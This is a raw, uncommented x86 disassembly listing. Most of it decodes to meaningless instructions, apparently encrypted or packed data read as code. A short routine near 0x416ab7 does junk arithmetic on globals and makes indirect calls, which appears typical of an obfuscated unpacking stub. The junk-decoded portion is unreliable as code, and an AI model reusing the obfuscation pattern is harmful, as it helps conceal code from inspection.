  416a4d:	xchg   ebp,eax
  416a4e:	push   esi
  416a4f:	jne    0x416a3a
  416a51:	les    edx,FWORD PTR [edi+0x7b163189]
  416a57:	sub    BYTE PTR [esi],bl
  416a59:	xchg   ebp,eax
  416a5a:	ret    0xd35a
  416a5d:	and    edi,ecx
  416a5f:	xor    al,0x4a
  416a61:	or     al,ah
  416a63:	mov    ecx,0xe7fac3b
  416a68:	xor    ecx,0x5b
  416a6b:	adc    edx,edx
  416a6d:	adc    BYTE PTR [edi+0x34],ah
  416a70:	clc    
  416a71:	jmp    0x1353c69
  416a76:	ret    
  416a77:	jno    0x416a9d
  416a79:	mov    bh,0x11
  416a7b:	call   0xce5c:0x2307bfc4
  416a82:	xchg   BYTE PTR [edi-0x1ef926ba],ch
  416a88:	test   BYTE PTR [edx+0x3d8a2090],ch
  416a8e:	sar    BYTE PTR [esi-0x7dbd111d],0x37
  416a95:	lods   al,BYTE PTR ds:[esi]
  416a96:	leave  
  416a97:	(bad)  
  416a99:	jmp    0x8c21e09d
  416a9e:	inc    ebp
  416a9f:	clc    
  416aa0:	mov    eax,DWORD PTR [eax]
  416aa2:	mov    eax,DWORD PTR [eax]
  416aa4:	mov    eax,DWORD PTR [eax]
  416aa6:	call   eax
  416aa8:	mov    eax,DWORD PTR [ebp-0x34]
  416aab:	mov    ecx,DWORD PTR ds:0x4240ca
  416ab1:	add    DWORD PTR [eax],ecx
  416ab3:	pop    edi
  416ab4:	pop    esi
  416ab5:	leave  
  416ab6:	ret    
  416ab7:	push   ebp
  416ab8:	mov    ebp,esp
  416aba:	sub    esp,0x18
  416abd:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  416ac4:	lea    eax,[ebp+0x14]
  416ac7:	mov    edx,DWORD PTR ds:0x42c00c
  416acd:	sub    DWORD PTR ds:0x42c01c,edx
  416ad3:	mov    DWORD PTR [ebp-0x4],eax
  416ad6:	and    DWORD PTR ds:0x42c01c,ebx
  416adc:	push   esi
  416add:	sub    ecx,esi
  416adf:	mov    esi,0xf89c85b6
  416ae4:	sub    ecx,ecx
  416ae6:	mov    DWORD PTR [ebp-0xc],esi
  416ae9:	or     DWORD PTR ds:0x42b000,0x59c6
  416af3:	lea    eax,[ebp-0xc]
  416af6:	sub    DWORD PTR ds:0x42b014,0x4110
  416b00:	mov    DWORD PTR [ebp-0x14],eax
  416b03:	add    ecx,ecx
  416b05:	mov    eax,DWORD PTR [ebp-0xc]
  416b08:	mov    edx,DWORD PTR [ebp-0x14]
  416b0b:	adc    DWORD PTR ds:0x429014,0x59c
  416b15:	mov    ecx,0x7510893
  416b1a:	xor    eax,ecx
  416b1c:	sub    DWORD PTR ds:0x42b014,0x42b004
  416b26:	add    eax,0x3272db
  416b2b:	mov    DWORD PTR [edx],eax
  416b2d:	mov    edx,DWORD PTR ds:0x42a004
  416b33:	add    DWORD PTR ds:0x429000,edx
  416b39:	mov    eax,ds:0x423ec6
  416b3e:	mov    edx,DWORD PTR ds:0x42901c
  416b44:	add    DWORD PTR ds:0x429000,edx
  416b4a:	mov    edx,DWORD PTR [ebp-0x4]
  416b4d:	sub    DWORD PTR ds:0x42d000,0x780c
  416b57:	mov    eax,DWORD PTR [eax]
  416b59:	add    eax,DWORD PTR [edx]
  416b5b:	add    DWORD PTR ds:0x42900c,ecx
  416b61:	push   edi
  416b62:	and    DWORD PTR ds:0x429020,0x0
  416b6c:	mov    edx,DWORD PTR ds:0x429020
  416b72:	inc    edx
  416b73:	mov    DWORD PTR ds:0x429020,edx
  416b79:	cmp    DWORD PTR ds:0x429020,0x25
  416b80:	jne    0x416b8f
  416b86:	push   DWORD PTR [ebp-0x20]
  416b89:	call   DWORD PTR ds:0x425028
  416b8f:	cmp    DWORD PTR ds:0x429020,0x19
  416b96:	jb     0x416b6c
  416b9c:	add    DWORD PTR ds:0x42c01c,0x73bd
  416ba6:	mov    DWORD PTR [ebp-0x8],eax
  416ba9:	adc    DWORD PTR ds:0x42d00c,ecx
  416baf:	mov    edi,DWORD PTR [ebp+0x8]
  416bb2:	sbb    DWORD PTR ds:0x42d018,0x1580
  416bbc:	mov    eax,ds:0x42404e
  416bc1:	and    DWORD PTR ds:0x42b01c,0x0
  416bcb:	jmp    0x416bdd
  416bd0:	mov    edx,DWORD PTR ds:0x42b01c
  416bd6:	inc    edx
  416bd7:	mov    DWORD PTR ds:0x42b01c,edx
  416bdd:	cmp    DWORD PTR ds:0x42b01c,0x1a
  416be4:	jae    0x416c47
  416bea:	cmp    DWORD PTR ds:0x42b01c,0x10
  416bf1:	jne    0x416c1c
  416bf7:	push   0x2d19
  416bfc:	push   DWORD PTR [ebp-0x10]
  416bff:	push   0x42d014
  416c04:	push   0x14d6
  416c09:	push   0x3bac
  416c0e:	push   0x6779
  416c13:	push   DWORD PTR [ebp-0xc]
  416c16:	call   DWORD PTR ds:0x42502c
  416c1c:	cmp    DWORD PTR ds:0x42b01c,0xf
  416c23:	jne    0x416c38
  416c29:	xor    edx,edx
  416c2b:	add    edx,DWORD PTR ds:0x42b01c
  416c31:	inc    edx
  416c32:	mov    DWORD PTR ds:0x42b01c,edx
  416c38:	jmp    0x416bd0
  416c3d:	adc    DWORD PTR ds:0x429028,0x58d4
  416c47:	mov    eax,DWORD PTR [eax+0x198]
  416c4d:	mov    edx,DWORD PTR ds:0x4243d1
  416c53:	mov    edx,DWORD PTR [edx]
  416c55:	add    DWORD PTR ds:0x42d008,edx
  416c5b:	xor    edi,ecx
  416c5d:	or     edx,0x793e
  416c63:	jmp    0x41901b
  416c68:	paddsw mm6,QWORD PTR es:[eax+0x63a36ce3]
  416c70:	mov    eax,0x35e19036
  416c75:	inc    esp
  416c76:	test   eax,0x61247adc
  416c7b:	(bad)  
  416c7c:	(bad)  
  416c7d:	pop    edi
  416c7e:	bound  esp,QWORD PTR [edx-0x23]
  416c81:	out    dx,al
  416c82:	pusha  
  416c83:	dec    esp
  416c84:	inc    edx
  416c85:	push   ebx
  416c86:	gs loope 0x416c41
  416c89:	jl     0x416c4c
  416c8b:	add    ah,BYTE PTR [edi-0x53]
  416c8e:	stos   DWORD PTR es:[edi],eax
  416c8f:	add    al,0x77
  416c91:	test   esp,0xf862874c
  416c97:	dec    esp
  416c98:	cs daa 
  416c9a:	push   ebx
  416c9b:	adc    eax,0x2e9a3c73
  416ca0:	cmp    dh,al
  416ca2:	mov    esp,0x5c7af956
  416ca7:	inc    esp
  416ca8:	jno    0x416cd8
  416caa:	ins    BYTE PTR es:[edi],dx
  416cab:	addr16 dec eax
  416cad:	adc    DWORD PTR [ecx-0x33],eax
  416cb0:	ret    
  416cb1:	jl     0x416d05
  416cb3:	mov    BYTE PTR [ecx-0x78],ch
  416cb6:	stc    
  416cb7:	xor    BYTE PTR [edx],bh
  416cb9:	stos   BYTE PTR es:[edi],al
  416cba:	push   es
  416cbb:	popf   
  416cbc:	lahf   
  416cbd:	cwde   
  416cbe:	mov    ebx,0x6fd45379
  416cc3:	out    0x17,al
  416cc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cc6:	xchg   BYTE PTR [edi+edx*1+0x1bda922f],cl
  416ccd:	cmp    al,0x41
  416ccf:	jmp    0x766026dc
  416cd4:	pop    ss
  416cd5:	lahf   
  416cd6:	sar    BYTE PTR [ecx+ebx*4-0x7f575760],cl
  416cdd:	pop    ebx
  416cde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cdf:	jge    0x416c8b
  416ce1:	mov    esp,0x335b765d
  416ce6:	scas   eax,DWORD PTR es:[edi]
  416ce7:	cli    
  416ce8:	(bad)  
  416ce9:	cmp    BYTE PTR [ebx],ch
  416ceb:	mov    edx,0xe7c98dd2
  416cf0:	or     bl,al
  416cf2:	arpl   bp,ax
  416cf4:	pop    eax
  416cf5:	sti    
  416cf6:	xchg   DWORD PTR [ebx+0x6c9b4319],esi
  416cfc:	cld    
  416cfd:	popa   
  416cfe:	sbb    dl,bl
  416d00:	int3   
  416d01:	jnp    0x416cd7
  416d03:	call   FWORD PTR [ebx]
  416d05:	mov    dl,0xd4
  416d07:	(bad)  
  416d08:	jle    0x416d38
  416d0a:	mov    edi,0x2a1dbcda
  416d0f:	fimul  DWORD PTR [esi+0x366ef1ad]
  416d15:	adc    esp,DWORD PTR [ecx+ebp*2-0x5c70420e]
  416d1c:	mov    ebp,DWORD PTR [ebp-0x16]
  416d1f:	pop    ss
  416d20:	loope  0x416d76
  416d22:	ret    
  416d23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d24:	mov    eax,ds:0x3484a2b0
  416d29:	mov    ecx,0x878808f
  416d2e:	and    al,0xa1
  416d30:	jle    0x416d91
  416d32:	dec    esi
  416d33:	cwde   
  416d34:	fwait
  416d35:	rol    BYTE PTR [edi],1
  416d37:	pop    ebx
  416d38:	fs push ecx
  416d3a:	jle    0x416cc1
  416d3c:	sub    BYTE PTR [esi+0xc004dc0],0x14
  416d43:	add    DWORD PTR [esi],eax
  416d45:	pop    esp
  416d46:	cld    
  416d47:	sbb    al,0xa8
  416d49:	dec    ecx
  416d4a:	test   BYTE PTR [edx-0xb50c0f1],dl
  416d50:	das    
  416d51:	out    0xc3,eax
  416d53:	mov    edx,0xde4259d8
  416d58:	sub    al,0xa3
  416d5a:	lock mov cl,BYTE PTR [esi-0x5f43d26a]
  416d61:	add    eax,0xf423b026
  416d66:	xor    ebx,DWORD PTR [edx+0x71e50424]
  416d6c:	push   0x7c90f7fe
  416d71:	add    ebp,0xffffffbe
  416d74:	lahf   
  416d75:	fist   DWORD PTR [ebx+0x72]
  416d78:	call   0x90d4df6c
  416d7d:	(bad)  
  416d7e:	nop
  416d7f:	sar    DWORD PTR [ebp+ebp*4+0x9cd74ad],cl
  416d86:	inc    edi
  416d87:	shl    DWORD PTR ds:0x4bbd4055,cl
  416d8d:	cmp    DWORD PTR [eax+0x30],eax
  416d90:	push   cs
  416d91:	sar    DWORD PTR [ecx+0x32],1
  416d94:	adc    eax,0x301d171c
  416d99:	jae    0x416d1d
  416d9b:	sbb    DWORD PTR [eax+0x46],esp
  416d9e:	and    cl,BYTE PTR [ecx-0x5e671d23]
  416da4:	bound  edx,QWORD PTR [ebx+0x3c34ff08]
  416daa:	dec    edi
  416dab:	ins    BYTE PTR es:[edi],dx
  416dac:	mov    BYTE PTR [edx-0x15],cl
  416daf:	dec    eax
  416db0:	sub    cl,BYTE PTR [edx+eax*2]
  416db3:	bound  ebx,QWORD PTR [esi+edx*1-0x773adad5]
  416dba:	xchg   esp,eax
  416dbb:	cs sub ebx,edi
  416dbe:	and    BYTE PTR [ebx-0x314e27c2],0x60
  416dc5:	xor    eax,0x685dba7a
  416dca:	iret   
  416dcb:	add    esp,DWORD PTR [ecx-0x13f93bf3]
  416dd1:	std    
  416dd2:	mov    dh,0xd6
  416dd4:	loop   0x416e34
  416dd6:	in     eax,dx
  416dd7:	mov    ah,0x76
  416dd9:	dec    eax
  416dda:	xchg   ebp,eax
  416ddb:	stos   BYTE PTR es:[edi],al
  416ddc:	xor    eax,0x9311967c
  416de1:	fcmovne st,st(1)
  416de3:	(bad)  
  416de4:	out    dx,al
  416de5:	and    eax,0x16a9adb3
  416dea:	jnp    0x416e3f
  416dec:	mov    ah,0xf2
  416dee:	ins    BYTE PTR es:[edi],dx
  416def:	cld    
  416df0:	mov    edx,0x967c4042
  416df5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416df6:	jo     0x416e13
  416df8:	pop    eax
  416df9:	daa    
  416dfa:	mov    ecx,0xaa6e96c1
  416dff:	adc    al,cl
  416e01:	in     al,0x66
  416e03:	call   0x5e00:0xe7f383e1
  416e0a:	inc    ebx
  416e0b:	outs   dx,BYTE PTR ds:[esi]
  416e0c:	mov    DWORD PTR [eax+0x10],ebp
  416e0f:	fcomp  QWORD PTR [edi]
  416e11:	lahf   
  416e12:	cdq    
  416e13:	inc    esp
  416e14:	mov    ecx,0x2d47c5f1
  416e19:	mov    bl,bl
  416e1b:	ror    dh,0xdb
  416e1e:	les    esi,FWORD PTR [ebx+0x65]
  416e21:	cmp    cl,dl
  416e23:	xlat   BYTE PTR ds:[ebx]
  416e24:	out    0xaf,al
  416e26:	mov    edx,0x11ba8f6f
  416e2b:	xor    BYTE PTR [edx-0x26cf1721],dh
  416e31:	in     eax,dx
  416e32:	cmp    BYTE PTR [ecx],0xb0
  416e35:	mov    al,ds:0x531e0f59
  416e3a:	dec    esp
  416e3b:	je     0x416e7e
  416e3d:	or     DWORD PTR [edi+ebx*8],edi
  416e40:	enter  0xf473,0x71
  416e44:	mov    edx,0xcad0a4de
  416e49:	jnp    0x416dec
  416e4b:	pop    esp
  416e4c:	sbb    BYTE PTR [esp+eiz*2-0x71850fe1],dl
  416e53:	out    0x3c,eax
  416e55:	mov    DWORD PTR [eax+0x30f6caf9],ebp
  416e5b:	retf   0xd443
  416e5e:	xor    eax,0x4861545d
  416e63:	push   ss
  416e64:	pop    ds
  416e65:	shr    DWORD PTR [esi+0x14],cl
  416e68:	nop
  416e69:	scas   eax,DWORD PTR es:[edi]
  416e6a:	push   esp
  416e6b:	xchg   ebx,eax
  416e6c:	fucompp 
  416e6e:	scas   eax,DWORD PTR es:[edi]
  416e6f:	pusha  
  416e70:	(bad)  
  416e71:	gs cmp bh,al
  416e74:	mov    BYTE PTR ds:0xe6a9,bh
  416e79:	or     al,0xcf
  416e7c:	pop    ebx
  416e7d:	inc    esi
  416e7e:	xor    cl,ah
  416e80:	retf   
  416e81:	mov    DWORD PTR [eax],0x2be70e7e
  416e87:	push   edx
  416e88:	imul   edx,DWORD PTR [eax+0x3d0e329],0x8aa795e2
  416e92:	loopne 0x416ef6
  416e94:	push   esp
  416e95:	mov    esi,?
  416e97:	and    cl,BYTE PTR [ebp+ecx*2-0x1015ab30]
  416e9e:	dec    edi
  416e9f:	pop    esp
  416ea0:	mov    ecx,DWORD PTR ds:0x44b763ec
  416ea6:	aaa    
  416ea7:	imul   ebp,DWORD PTR [ecx+0x1b8e7238],0x75ac70e8
  416eb1:	mov    ds:0xab41eba0,al
  416eb6:	push   0xe301dd62
  416ebb:	push   esi
  416ebc:	push   cs
  416ebd:	gs retf 0x7252
  416ec1:	push   ebp
  416ec2:	outs   dx,BYTE PTR ds:[esi]
  416ec3:	ffreep st(2)
  416ec5:	mov    ah,0x4b
  416ec7:	mul    DWORD PTR [ecx+0x10]
  416eca:	xchg   ebp,eax
  416ecb:	mov    ch,0xf6
  416ecd:	mov    ebx,0x12faa37e
  416ed2:	sub    BYTE PTR [edi-0x356beace],bh
  416ed8:	je     0x416f0a
  416eda:	fst    QWORD PTR [edx+0x6f]
  416edd:	lahf   
  416ede:	pushf  
  416edf:	cmp    al,BYTE PTR [ebp+0x37]
  416ee2:	ds retf 0xf3ce
  416ee6:	pop    ds
  416ee7:	pop    esi
  416ee8:	rol    BYTE PTR [esi-0x1e3e5a60],cl
  416eee:	sbb    BYTE PTR [esi-0x1ec33f7b],al
  416ef4:	inc    esp
  416ef5:	or     bl,BYTE PTR [edi+0x1f]
  416ef8:	pop    ebp
  416ef9:	xchg   ebx,eax
  416efa:	pop    edx
  416efb:	es push ebp
  416efd:	push   bx
  416eff:	mov    ebx,0x31a4fdda
  416f04:	cdq    
  416f05:	sbb    eax,0xb2a0ca3
  416f0a:	retf   0x623f
  416f0d:	push   edx
  416f0e:	addr16 clc 
  416f10:	mov    WORD PTR [edi-0xa],?
  416f13:	jecxz  0x416eed
  416f15:	jmp    0x416f31
  416f17:	pop    eax
  416f18:	adc    DWORD PTR [ecx],esi
  416f1a:	sbb    BYTE PTR [edi+eiz*1+0x1e5dfb5c],ch
  416f21:	psrlq  mm5,QWORD PTR cs:[esi-0x90e2362]
  416f29:	mov    edi,0x45d5456c
  416f2e:	xor    bl,ch
  416f30:	jno    0x416f8a
  416f32:	jnp    0x416f9d
  416f34:	(bad)  
  416f36:	int    0x42
  416f38:	test   al,0x1c
  416f3a:	mov    ah,0xe9
  416f3c:	loopne 0x416f7d
  416f3e:	mov    ebp,0x57e98219
  416f43:	jb     0x416f2b
  416f45:	inc    eax
  416f46:	push   ebx
  416f47:	test   BYTE PTR [edi+ebp*4+0x9e151af],bl
  416f4e:	iret   
  416f4f:	in     eax,dx
  416f50:	loop   0x416f24
  416f52:	cdq    
  416f53:	das    
  416f54:	xchg   edx,edi
  416f56:	or     DWORD PTR [edi-0x2c],esi
  416f59:	jns    0x416fd3
  416f5b:	sub    BYTE PTR ds:[edi+0x585ce4d7],0xca
  416f63:	xchg   edx,eax
  416f64:	inc    ebp
  416f65:	add    bl,al
  416f67:	js     0x416f95
  416f69:	jb     0x416f1b
  416f6b:	and    al,BYTE PTR [esi-0x5a]
  416f6e:	push   0x249bb3ba
  416f73:	call   0x44fb:0x8b18bca7
  416f7a:	mov    esi,0x71975807
  416f7f:	daa    
  416f80:	in     eax,dx
  416f81:	xor    eax,0x85eb267e
  416f86:	aad    0xa0
  416f88:	fdiv   st,st(1)
  416f8a:	inc    ebp
  416f8b:	in     eax,dx
  416f8c:	cli    
  416f8d:	or     dl,BYTE PTR [esi]
  416f8f:	add    ah,BYTE PTR [ebx-0x3e]
  416f92:	mov    fs,ecx
  416f94:	push   ecx
  416f95:	mov    ch,0xc4
  416f97:	nop
  416f98:	js     0x416fd5
  416f9a:	xchg   ebp,eax
  416f9b:	pop    esp
  416f9c:	mov    ah,0xad
  416f9e:	cmp    al,0x8
  416fa0:	je     0x416f49
  416fa2:	and    BYTE PTR [edi],dh
  416fa4:	dec    esp
  416fa5:	aas    
  416fa6:	call   0xa4d77731
  416fab:	add    ebx,DWORD PTR [edi]
  416fad:	fild   DWORD PTR [eax+0x13]
  416fb0:	sahf   
  416fb1:	dec    ebx
  416fb2:	sub    BYTE PTR [edx+0x55],0x92
  416fb6:	je     0x416fa1
  416fb8:	mov    dh,0x39
  416fba:	mov    ebp,0x9979e732
  416fbf:	xor    ebp,DWORD PTR [ebx-0x72771566]
  416fc5:	dec    ebx
  416fc6:	icebp  
  416fc7:	outs   dx,BYTE PTR ds:[esi]
  416fc8:	lds    esp,FWORD PTR [ebp-0x2]
  416fcb:	retf   
  416fcc:	push   ebp
  416fcd:	fnstsw WORD PTR [eax-0x1854c792]
  416fd3:	pop    es
  416fd4:	cli    
  416fd5:	pop    ecx
  416fd6:	sti    
  416fd7:	icebp  
  416fd8:	daa    
  416fd9:	jne    0x416fd3
  416fdb:	xor    DWORD PTR [ebp+0x6b],0xffffffc6
  416fdf:	fsubr  st,st(2)
  416fe1:	mov    dh,0x88
  416fe3:	jne    0x417063
  416fe5:	rcl    eax,1
  416fe7:	ja     0x416f8c
  416fe9:	(bad)  
  416fea:	adc    BYTE PTR [eax+esi*2],al
  416fed:	sub    bl,bh
  416fef:	int    0x45
  416ff1:	jae    0x416fc4
  416ff3:	add    ecx,edx
  416ff5:	sbb    BYTE PTR [ecx+0x426a233f],0x6b
  416ffc:	add    al,0xb7
  416ffe:	pop    ss
  416fff:	dec    ebx
  417000:	fldenv [edx+0x62a1bce8]
  417006:	cmp    eax,0xfafa23be
  41700b:	inc    esi
  41700c:	pop    edi
  41700d:	ins    DWORD PTR es:[edi],dx
  41700e:	push   esp
  41700f:	scas   al,BYTE PTR es:[edi]
  417010:	scas   eax,DWORD PTR es:[edi]
  417011:	mov    DWORD PTR [ebp-0xddc7c86],edx
  417017:	xchg   ecx,eax
  417018:	add    DWORD PTR [edx+edi*8-0x8],esi
  41701c:	fst    DWORD PTR ds:0xb717bf6
  417022:	cwde   
  417023:	jne    0x416fad
  417025:	xor    bp,WORD PTR [ebp+0x3b]
  417029:	pop    ss
  41702a:	jl     0x41702f
  41702c:	inc    ecx
  41702d:	mov    edx,0xff11ed6a
  417032:	sbb    al,0x70
  417034:	add    ebp,DWORD PTR [edi+0x3c91565]
  41703a:	cmp    DWORD PTR [ebx-0x5d],esi
  41703d:	mov    ecx,0xb3402244
  417042:	mov    edx,0x10f4df5
  417047:	xchg   edi,eax
  417048:	xchg   ah,dh
  41704a:	mov    eax,0x52275420
  41704f:	out    dx,eax
  417050:	or     eax,0x48727560
  417055:	pop    ebx
  417056:	jge    0x41701e
  417058:	jle    0x417009
  41705a:	cs call 0xb2c5:0x906a9254
  417062:	xchg   ebp,eax
  417063:	sub    bl,BYTE PTR ds:0x7e2b7ec1
  417069:	(bad)  
  41706a:	sti    
  41706b:	xchg   ebp,eax
  41706c:	lods   al,BYTE PTR ds:[esi]
  41706d:	jp     0x4170cf
  41706f:	repnz lock push edi
  417072:	in     al,dx
  417073:	mov    ch,dl
  417075:	mov    esp,0xdb729978
  41707a:	push   esp
  41707b:	push   edx
  41707c:	in     eax,0xaa
  41707e:	pop    ebx
  41707f:	sbb    al,0x5e
  417081:	sti    
  417082:	add    bh,bl
  417084:	into   
  417085:	mov    bh,0xe5
  417087:	jle    0x4170ad
  417089:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41708a:	les    esp,FWORD PTR [ecx]
  41708c:	rcl    BYTE PTR [esi-0x7bd0aa84],cl
  417092:	cli    
  417093:	cwde   
  417094:	and    DWORD PTR [esi+eax*4],ecx
  417097:	jle    0x4170a2
  417099:	mov    ecx,0xff29137f
  41709e:	push   0x76453baf
  4170a3:	jae    0x41710b
  4170a5:	das    
  4170a6:	dec    esi
  4170a7:	lock aas 
  4170a9:	in     eax,0x8d
  4170ab:	scas   al,BYTE PTR es:[edi]
  4170ac:	dec    esp
  4170ad:	mov    ah,0x82
  4170af:	(bad)  
  4170b0:	push   esp
  4170b1:	mov    al,0x3
  4170b3:	cmp    al,0x3e
  4170b5:	sar    BYTE PTR [esi],cl
  4170b7:	xor    bh,BYTE PTR [esi]
  4170b9:	cmp    bh,dl
  4170bb:	test   al,0x64
  4170bd:	mov    edi,0xf1d14b89
  4170c2:	lahf   
  4170c3:	push   ebx
  4170c4:	add    DWORD PTR [esi-0x5fa7f9bd],ebp
  4170ca:	jo     0x41707d
  4170cc:	retf   0x1280
  4170cf:	out    dx,al
  4170d0:	clc    
  4170d1:	lods   eax,DWORD PTR ds:[esi]
  4170d2:	mov    dh,0xdb
  4170d4:	mov    dh,0x2f
  4170d6:	in     eax,dx
  4170d7:	push   ecx
  4170d8:	push   esi
  4170d9:	icebp  
  4170da:	loopne 0x417123
  4170dc:	lods   eax,DWORD PTR ds:[esi]
  4170dd:	rcl    BYTE PTR [ecx+0x39],1
  4170e0:	les    eax,FWORD PTR [ebx+0x6a8d6685]
  4170e6:	push   es
  4170e7:	inc    esp
  4170e8:	mov    eax,0xe66f7f29
  4170ed:	jo     0x4170bb
  4170ef:	inc    edi
  4170f0:	outs   dx,BYTE PTR ds:[esi]
  4170f1:	sbb    ebx,ebx
  4170f3:	das    
  4170f4:	inc    ebp
  4170f5:	jg     0x41708c
  4170f7:	shl    DWORD PTR [eax+0x1c],1
  4170fa:	mov    ah,ch
  4170fc:	mov    bh,0x66
  4170fe:	out    0x62,eax
  417100:	mov    al,ds:0x62c9ce2e
  417105:	add    al,0x86
  417107:	imul   ebp,DWORD PTR [eax-0xa],0xffffffbc
  41710b:	inc    edx
  41710c:	call   0x1ccf:0xaba7a61d
  417113:	push   0x1b15c06
  417118:	xchg   esp,eax
  417119:	add    eax,0x508a40f4
  41711e:	out    0x37,al
  417120:	lea    ebp,[ecx]
  417122:	push   eax
  417123:	pop    es
  417124:	cmp    eax,0x17cd972a
  417129:	cdq    
  41712a:	pop    es
  41712b:	outs   dx,BYTE PTR ds:[esi]
  41712c:	pop    eax
  41712d:	jmp    0x41715a
  41712f:	mov    al,ds:0xf4ee110d
  417134:	or     edx,esp
  417136:	not    BYTE PTR [esi+0x13]
  417139:	mov    dh,0x71
  41713b:	cmp    edx,DWORD PTR [ebx-0x3c]
  41713e:	mov    eax,0x2cc4bcb4
  417143:	jp     0x4170ea
  417145:	outs   dx,BYTE PTR ds:[esi]
  417146:	icebp  
  417147:	or     edx,DWORD PTR [edx+0x5]
  41714a:	sub    DWORD PTR [ebx],ebp
  41714c:	shl    DWORD PTR [edi],cl
  41714e:	mov    BYTE PTR [edi-0x8],ch
  417151:	sub    al,0xb5
  417153:	sub    eax,0x7ecac57a
  417158:	mov    edi,0x96086756
  41715d:	bound  ecx,QWORD PTR [eax]
  41715f:	inc    edi
  417160:	pop    ds
  417161:	dec    edx
  417162:	jecxz  0x4171d7
  417164:	xchg   dh,dl
  417166:	mov    ch,BYTE PTR [eax+ebp*4-0x54]
  41716a:	ins    BYTE PTR es:[edi],dx
  41716b:	cld    
  41716c:	clc    
  41716d:	sbb    DWORD PTR [edx-0x670eea38],esi
  417173:	sub    dl,dh
  417175:	leave  
  417176:	xchg   edi,eax
  417177:	iret   
  417178:	or     BYTE PTR [edx+0x6d],dh
  41717b:	pushf  
  41717c:	bound  ebp,QWORD PTR [ecx+0x42657bfa]
  417182:	out    dx,eax
  417183:	or     bl,0x7b
  417186:	sbb    eax,0xe27438d8
  41718b:	and    cl,BYTE PTR [bx]
  41718e:	les    esi,FWORD PTR [ebp-0x1c6dbeda]
  417194:	jmp    0x4176:0x40730304
  41719b:	jnp    0x4171ae
  41719d:	pop    esp
  41719e:	dec    esp
  41719f:	call   0x474ae8a8
  4171a4:	call   0x9ddfd774
  4171a9:	les    edi,FWORD PTR [ecx+esi*1-0x4663be5]
  4171b0:	popa   
  4171b1:	adc    ch,BYTE PTR [edx+0x70edf11f]
  4171b7:	mov    ecx,0x1f660e09
  4171bc:	cld    
  4171bd:	pop    eax
  4171be:	enter  0xd0f7,0x8f
  4171c2:	xlat   BYTE PTR ds:[ebx]
  4171c3:	cld    
  4171c4:	ffreep st(6)
  4171c6:	mov    WORD PTR [ecx+0x49],fs
  4171c9:	mov    al,0xb1
  4171cb:	xchg   ebx,eax
  4171cc:	push   eax
  4171cd:	mov    ecx,0x3b317ace
  4171d2:	pop    es
  4171d3:	fsub   QWORD PTR [esi-0x8]
  4171d6:	push   0x54
  4171d8:	fwait
  4171d9:	pop    ebp
  4171da:	pop    ebx
  4171db:	sub    eax,0xdb7e777c
  4171e0:	xchg   DWORD PTR [edx+eiz*1-0x3d],ebp
  4171e4:	aas    
  4171e5:	(bad)  
  4171e6:	mov    ds:0x84de9115,al
  4171eb:	(bad)  
  4171ec:	xor    eax,0xfc118baa
  4171f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171f2:	outs   dx,BYTE PTR ds:[esi]
  4171f3:	shl    DWORD PTR [eax-0xbfb8d67],cl
  4171f9:	out    0x2b,eax
  4171fb:	sti    
  4171fc:	rcr    BYTE PTR [ecx],0xdf
  4171ff:	in     eax,0xd2
  417201:	ret    0x4f4f
  417204:	jmp    0x1bd773d8
  417209:	jo     0x417205
  41720b:	and    eax,0xb85d01a6
  417210:	mov    cl,0x39
  417212:	test   edi,ebp
  417214:	call   0x56f19d3b
  417219:	add    BYTE PTR [edi-0x36],bh
  41721c:	pop    ss
  41721d:	loopne 0x417235
  41721f:	or     eax,0x3c2cc200
  417224:	fdivr  QWORD PTR [edx+0x39]
  417227:	xchg   ebx,ebp
  417229:	ret    
  41722a:	jecxz  0x41727f
  41722c:	leave  
  41722d:	xchg   ebp,eax
  41722e:	cmp    edx,ecx
  417230:	add    DWORD PTR [eax],edi
  417232:	test   eax,0xee9ea9a2
  417237:	dec    eax
  417238:	push   edx
  417239:	dec    ebp
  41723a:	mov    edx,0x3e41d097
  41723f:	mov    al,0x5f
  417241:	daa    
  417242:	in     eax,dx
  417243:	js     0x41729b
  417245:	fwait
  417246:	jb     0x417237
  417248:	sbb    eax,0x24386f47
  41724d:	mov    dl,0x51
  41724f:	lods   eax,DWORD PTR ds:[esi]
  417250:	sbb    eax,0x5c615db
  417255:	test   edx,eax
  417257:	mov    eax,0x9d7e346b
  41725c:	sub    DWORD PTR [ecx-0x37],edi
  41725f:	mov    ebp,DWORD PTR [edi-0x45]
  417262:	imul   ebx,DWORD PTR [esi+0x79],0x5e
  417266:	out    dx,eax
  417267:	cmp    dh,BYTE PTR [eax+0x56801b80]
  41726d:	add    DWORD PTR [ecx-0x80],eax
  417270:	xchg   ebp,eax
  417271:	or     al,0x80
  417273:	jae    0x417218
  417275:	lods   eax,DWORD PTR ds:[esi]
  417276:	aas    
  417277:	jmp    0x4172c2
  417279:	jmp    0x3adcf9c8
  41727e:	enter  0x4ea1,0x73
  417282:	fadd   QWORD PTR [ebx-0x7d7d91b2]
  417288:	neg    edx
  41728a:	sub    dl,bl
  41728c:	fstp   QWORD PTR [esi+esi*1+0x8]
  417290:	jmp    0x4172ab
  417292:	daa    
  417293:	push   cs
  417294:	sub    BYTE PTR [ecx],ch
  417296:	aad    0xbc
  417298:	outs   dx,BYTE PTR ds:[esi]
  417299:	jns    0x41724a
  41729b:	push   ds
  41729c:	sar    BYTE PTR [edi],1
  41729e:	sbb    eax,0x7c32fe14
  4172a3:	movzx  ebp,WORD PTR [ebx-0x1810b598]
  4172aa:	ds int 0xcf
  4172ad:	xchg   edx,eax
  4172ae:	add    esi,DWORD PTR [ebx+0x35]
  4172b1:	jge    0x417298
  4172b3:	sub    DWORD PTR [ecx+0x572486c9],edx
  4172b9:	jle    0x4172ce
  4172bb:	sub    al,0xab
  4172bd:	shl    DWORD PTR [ebx-0x53219ba],cl
  4172c3:	dec    esi
  4172c4:	and    bl,BYTE PTR [ebx+0xaf2ec7d]
  4172ca:	cmp    DWORD PTR [ebp+0x34e19c01],esi
  4172d0:	retf   
  4172d1:	mov    eax,0xb0e42121
  4172d6:	outs   dx,BYTE PTR ds:[esi]
  4172d7:	mov    dh,0xd5
  4172d9:	sar    edi,cl
  4172db:	xor    edi,DWORD PTR [ebx]
